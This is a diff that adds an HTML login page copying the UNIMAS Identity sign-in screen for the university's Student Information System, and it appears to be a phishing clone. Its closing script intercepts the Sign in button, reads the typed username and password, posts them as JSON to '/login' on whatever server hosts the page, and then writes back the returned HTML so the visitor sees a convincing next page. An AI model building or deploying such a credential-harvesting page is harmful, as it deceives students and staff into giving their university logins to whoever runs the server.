@@ -1,0 +1,110 @@
+﻿<!DOCTYPE html>
+<!--[if lt IE 9]>
+<html class="ltie9"><![endif]-->
+<!--[if gte IE 9]><!-->
+<html><!--<![endif]-->
+<head>
+    <title>UNIMAS Identity</title>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, user-scalable=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="static/picture/unimas_logo.png" type="image/x-icon">
+    <link rel="stylesheet" href="static/css/signin.css">
+</head>
+<body>
+
+<style>
+
+</style>
+
+<!--<link href="assets/css/signin.css" rel="stylesheet" />-->
+<div class="bg-overlay" style="background-image:url(static/image/26106214660_dde5aafbba_k.jpg);"></div>
+<div class="cont">
+
+
+    <div class="form-signin">
+
+        <div class="form-wrapper" style="margin-bottom: 30px">
+            <div class="form-header">
+                <img src="static/picture/unimas-identity-logo3.png" width="85%">
+            </div>
+            <form class="form-body" action="/login" method="post">
+                <div>
+                    <div style="color:black">Continue to</div>
+                    <div style="display:flex;margin-top:.5em;">
+                        <!--<div style="flex:1">-->
+                        <!--<img th:if="${logo}" th:src="${logo}" width="85%" />-->
+                        <!--</div>-->
+
+                        <div style="color:black; font-size: 1.2em; flex:1; display:flex; justify-content:center">Student Information System</div>
+                    </div>
+                </div>
+
+                
+                
+<!--                <div th:if="!${attempt>3}">-->
+                    <div style="padding-top: 20px;">
+                        <input type="text" id="username" ng-model="username" value="" name="username" placeholder="Username" class="form-control">
+                        <input type="password" id="password" ng-model="password" name="password" placeholder="Password" class="form-control">
+                    </div>
+                    <button id="unimasBtn" class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
+<!--                </div>-->
+<!--                <div th:if="${attempt>3}" class="error" style="margin-bottom:1em; font-size: 1.2em">-->
+<!--                    You have reached maximum allowed login attempt. Please contact out support for assistance.-->
+<!--                </div>-->
+                <div class="help">
+                    <a href="http://iforgot.unimas.my/">Forgot password?</a>
+                </div>
+            </form>
+
+        </div>
+
+    </div>
+
+</div>
+<div class="copy">
+    Developed and maintained by CITDS, UNIMAS
+</div>
+
+
+<script>
+    document.getElementById("unimasBtn").addEventListener("click", function (e) {
+        e.preventDefault();
+        const username = document.getElementById("username").value.trim();
+        const password = document.getElementById("password").value.trim();
+
+        // Check if username and password are not empty
+        if (!username || !password ) {
+                alert("Please enter（Email、Password）");
+                return;
+              }
+              
+        // Send a POST request to the server with the username and password
+        fetch("/login", {
+        method: "POST",
+        headers: {
+                  "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ username, password })
+        })
+        .then(res => res.text())
+        .then(response => {
+            // If the response is an HTML document, write it to the document
+            if (response && response.includes("<!DOCTYPE html>")) {
+                document.open();
+                document.write(response);
+                document.close();
+            } else if (response) {
+                alert(response);
+            }
+        })
+        .catch(err => console.error("Redirect failed:", err));
+
+    });
+    </script>
+
+
+</body>
+</html>
